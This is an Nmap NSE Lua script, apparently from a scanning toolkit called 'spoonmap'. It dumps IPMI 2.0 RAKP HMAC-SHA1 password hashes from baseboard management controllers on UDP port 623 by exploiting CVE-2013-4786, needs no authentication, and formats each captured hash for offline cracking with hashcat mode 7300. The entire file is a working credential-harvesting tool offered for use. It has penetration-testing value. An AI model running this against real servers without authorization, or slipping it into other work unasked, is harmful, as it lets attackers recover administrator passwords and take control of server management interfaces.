local ipmi      = require "ipmi"
local nmap      = require "nmap"
local rand      = require "rand"
local shortport = require "shortport"
local stdnse    = require "stdnse"
local string    = require "string"

-- vim: set filetype=lua :

description = [[
Captures the IPMI 2.0 RAKP HMAC-SHA1 hash for offline cracking (hashcat mode 7300).

Performs an RMCP+ Open Session + RAKP-1 exchange against the BMC. The BMC
returns an HMAC-SHA1 keyed with the user's password, which can be cracked
offline without further interaction. No authentication or special privileges
are required — any responding BMC will return the hash.

References:
* https://www.cvedetails.com/cve/CVE-2013-4786/
* https://hashcat.net/wiki/doku.php?id=hashcat (mode 7300, IPMI2 RAKP HMAC-SHA1)
]]
---
-- @usage nmap -sU -p 623 --script spoonmap/nse/ipmi-hashdump.nse <host>
-- @args ipmi-hashdump.username Username to request hash for (default: "admin")
-- @output
-- 623/udp open  asf-rmcp
-- | ipmi-hashdump:
-- |   Username: admin
-- |_  Hash: $rakp$<salt_hex>$<hmac_hex>

author   = "spoonmap"
license  = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "safe", "auth"}

portrule = shortport.port_or_service(623, {"asf-rmcp", "ipmi"}, "udp",
                                     {"open", "open|filtered"})

local function to_hex(s)
  return (s:gsub(".", function(c) return string.format("%02x", c:byte()) end))
end

action = function(host, port)
  local username = stdnse.get_script_args("ipmi-hashdump.username") or "admin"

  local console_session_id = rand.random_string(4)
  local console_random_id  = rand.random_string(16)

  local socket = nmap.new_socket()
  socket:set_timeout(5000)

  local ok, err = socket:connect(host, port, "udp")
  if not ok then
    stdnse.debug1("connect failed: %s", err)
    return nil
  end

  -- Step 1: RMCP+ Open Session Request
  ok, err = socket:send(ipmi.session_open_request(console_session_id))
  if not ok then socket:close(); return nil end

  local reply
  ok, reply = socket:receive()
  if not ok then socket:close(); return nil end

  local session = ipmi.parse_open_session_reply(reply)
  if not session or session.session_payload_type ~= ipmi.PAYLOADS["RMCPPLUSOPEN_REP"] then
    socket:close(); return nil
  end
  if session.error_code ~= 0 then
    socket:close(); return nil
  end

  -- Step 2: RAKP-1 Request — BMC returns HMAC-SHA1 keyed with user's password
  ok, err = socket:send(
    ipmi.rakp_1_request(session.bmc_session_id, console_random_id, username))
  if not ok then socket:close(); return nil end

  ok, reply = socket:receive()
  socket:close()
  if not ok then return nil end

  local rakp2 = ipmi.parse_rakp_1_reply(reply)
  if not rakp2 or rakp2.session_payload_type ~= ipmi.PAYLOADS["RAKP2"] then
    return nil
  end
  if rakp2.error_code ~= 0 then
    return nil
  end

  -- Build hashcat mode 7300 hash string: $rakp$<salt_hex>$<hmac_hex>
  local salt = ipmi.rakp_hmac_sha1_salt(
    console_session_id,
    session.bmc_session_id,
    console_random_id,
    rakp2.bmc_random_id,
    rakp2.bmc_guid,
    0x14,
    username
  )

  local out = stdnse.output_table()
  out["Username"] = username
  out["Hash"] = "$rakp$" .. to_hex(salt) .. "$" .. to_hex(rakp2.hmac_sha1)
  return out
end
